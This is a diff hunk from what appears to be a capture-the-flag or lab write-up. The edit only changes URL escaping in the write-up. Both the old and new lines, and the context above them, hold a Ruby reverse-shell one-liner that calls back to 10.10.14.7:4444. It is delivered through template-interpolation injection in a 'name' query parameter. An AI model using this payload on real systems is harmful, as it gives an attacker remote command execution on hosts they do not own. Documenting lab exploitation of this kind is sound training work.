@@ -299,7 +299,7 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.14.7",4444);while(cmd=c.ge
 I replaced the `sleep 10` part of the PoC request with the above reverse shell, and proxied through burp:
 
 ```
-http://10.10.14.7:8000/index.html?name=#{%20`ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.14.7",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`}
+http://10.10.14.7:8000/index.html?name=#{\%20`ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.14.7",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`}
 ```
 
 ... and proxied it through burp (again, to match the url encoding scheme):
